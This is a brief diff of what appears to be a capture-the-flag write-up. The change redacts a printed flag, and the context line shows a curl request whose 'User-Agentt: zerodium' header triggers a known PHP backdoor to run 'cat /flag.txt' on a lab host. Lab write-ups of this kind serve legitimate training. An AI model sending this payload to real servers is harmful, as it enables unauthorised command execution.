@@ -73,7 +73,7 @@ curl -s http://10.66.142.46/ -H "User-Agentt: zerodiumsystem('cat /flag.txt');"
 ```
 
 ```
-flag{4127d0530abf16d6d23973e3df8dbecb}
+flag{4127d&&????becb}
 ```
 
 ---
